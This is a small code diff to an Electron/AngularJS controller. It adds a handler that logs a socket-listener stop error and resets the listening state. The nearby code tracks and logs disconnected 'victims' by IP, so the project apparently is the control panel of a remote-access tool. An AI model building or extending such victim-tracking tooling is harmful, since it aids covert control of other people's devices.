@@ -97,6 +97,12 @@ app.controller("AppCtrl", ($scope) => {
     $appCtrl.$apply();
   });
 
+  ipcRenderer.on("SocketIO:StopError", (event, error) => {
+    $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
+    $appCtrl.isListen = false;
+    $appCtrl.$apply();
+  });
+
   ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
     $appCtrl.Log('[¡] Victim Disconnected ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
     delete viclist[index];
